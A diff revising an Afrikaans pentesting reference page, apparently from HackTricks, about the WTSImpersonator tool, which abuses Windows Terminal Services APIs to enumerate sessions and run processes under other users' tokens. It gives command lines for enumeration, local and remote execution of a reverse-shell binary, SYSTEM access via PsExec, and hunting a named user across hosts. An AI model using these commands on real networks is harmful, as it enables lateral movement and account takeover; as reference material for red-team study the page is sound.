@@ -2,53 +2,53 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Die **WTS Impersonator**-tool buit die **"\\pipe\LSM_API_service"** RPC Named pipe uit om aangemelde gebruikers diskreet te enumeriseer en hul tokens te kaap, waardeur tradisionele Token Impersonation-tegnieke omseil word. Hierdie benadering fasiliteer naatlose laterale bewegings binne netwerke. Die innovasie agter hierdie tegniek word aan **Omri Baso toegeskryf, wie se werk op [GitHub](https://github.com/OmriBaso/WTSImpersonator) beskikbaar is**.<sup>[[1]](#references)</sup>
+**WTSImpersonator**, deur Omri Baso, gebruik Windows Terminal Services APIs wat deur die `\\pipe\LSM_API_service` RPC named pipe blootgestel word om aangemelde sessies te enumerateer en 'n proses met 'n geselekteerde gebruiker se token te begin. Dit ondersteun plaaslike enumeration en uitvoering, sowel as remote service-based workflows.<sup>[[1]](#references)</sup>
 
-### Kernfunksionaliteit
+## Kernfunksionaliteit
 
-Die tool werk deur middel van ’n reeks API calls:
-```bash
+Die plaaslike execution flow gebruik die volgende API sequence:<sup>[[1]](#references)[[2]](#references)</sup>
+```text
 WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
 ```
-### Sleutelmodules en Gebruik
+## Modules en gebruik
 
-- **Enumerating Users**: Plaaslike en afgeleë user enumeration is met die tool moontlik deur commands vir enige scenario te gebruik:
+- **Enumereer gebruikers:** Die tool kan sessies op die plaaslike of 'n remote host enumereer.
 
 - Plaaslik:
 ```bash
 .\WTSImpersonator.exe -m enum
 ```
-- Afgeleë, deur 'n IP-adres of hostname te spesifiseer:
+- Remote, spesifiseer 'n IP-adres of hostname:
 ```bash
 .\WTSImpersonator.exe -m enum -s 192.168.40.131
 ```
 
-- **Executing Commands**: Die `exec`- en `exec-remote`-modules vereis 'n **Service**-konteks om te funksioneer. Plaaslike uitvoering benodig slegs die WTSImpersonator executable en 'n command:
+- **Voer commands uit:** Die `exec`- en `exec-remote`-modules benodig 'n service-konteks. Microsoft dokumenteer dat `WTSQueryUserToken` vereis dat die caller as `LocalSystem` met die `SE_TCB_NAME` privilege loop.<sup>[[2]](#references)</sup>
 
-- Voorbeeld van plaaslike command execution:
+- Plaaslike command execution:
 ```bash
 .\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
 ```
-- PsExec64.exe kan gebruik word om 'n Service-konteks te verkry:
+- PsExec kan 'n `LocalSystem` command prompt vir testing begin:
 ```bash
 .\PsExec64.exe -accepteula -s cmd.exe
 ```
 
-- **Remote Command Execution**: Behels die skep en installering van 'n Service op afstand, soortgelyk aan PsExec.exe, wat uitvoering met die toepaslike permissions moontlik maak.
+- **Remote command execution:** Die remote mode skep 'n service op die target in 'n PsExec-agtige workflow en vereis dus regte om daardie service te installeer en te begin.<sup>[[1]](#references)</sup>
 
-- Voorbeeld van remote execution:
+- Voorbeeld:
 ```bash
 .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
 ```
 
-- **User Hunting Module**: Teiken spesifieke users oor verskeie machines en voer code onder hul credentials uit. Dit is veral nuttig om Domain Admins te teiken wat local admin-regte op verskeie systems het.
-- Gebruiksvoorbeeld:
+- **User hunting:** Die `user-hunter`-module soek deur 'n host-lys vir 'n genoemde gebruiker se sessie en probeer om die verskafde program in daardie konteks uit te voer.<sup>[[1]](#references)</sup>
+- Gebruikvoorbeeld:
 ```bash
 .\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
 ```
 
-## Verwysings
+## References
 
-- [1] [WTSImpersonator - GitHub](https://github.com/OmriBaso/WTSImpersonator)
-
+- [1] [OmriBaso/WTSImpersonator](https://github.com/OmriBaso/WTSImpersonator)
+- [2] [Microsoft: `WTSQueryUserToken` funksie](https://learn.microsoft.com/en-us/windows/win32/api/wtsapi32/nf-wtsapi32-wtsqueryusertoken)
 {{#include ../../banners/hacktricks-training.md}}
